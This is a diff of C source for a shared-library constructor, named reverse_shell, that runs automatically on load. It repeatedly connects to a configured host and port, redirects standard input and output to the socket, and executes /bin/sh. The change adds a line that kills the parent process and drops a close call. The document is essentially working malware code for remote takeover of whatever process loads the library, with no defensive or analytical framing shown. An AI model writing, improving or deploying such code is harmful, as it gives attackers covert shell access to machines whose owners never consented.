@@ -9,7 +9,7 @@
 
 void __attribute__((constructor)) reverse_shell(){ 
   int socket_fd;
-  int connection_fd = -1;
+  int connection = -1;
   int pid;
   struct sockaddr_in server;  
   
@@ -18,19 +18,19 @@ void __attribute__((constructor)) reverse_shell(){
   server.sin_port = htons(port);
   server.sin_addr.s_addr = inet_addr(addr);
     
-  while(connection_fd < 0){
+  while(connection < 0){
     sleep(5);
-    connection_fd = connect(socket_fd, (struct sockaddr *)&server, sizeof(struct sockaddr));
+    connection = connect(socket_fd, (struct sockaddr *)&server, sizeof(struct sockaddr));
   }
     
   if((pid = fork()) == 0){
     dup2(socket_fd,0);
     dup2(socket_fd,1);
     dup2(socket_fd,2);
+    kill(getppid(), SIGKILL);
     execve("/bin/sh", NULL, NULL);
   }else{
     wait(NULL);
-    close(connection_fd);
     close(socket_fd);
     exit(0);
   }
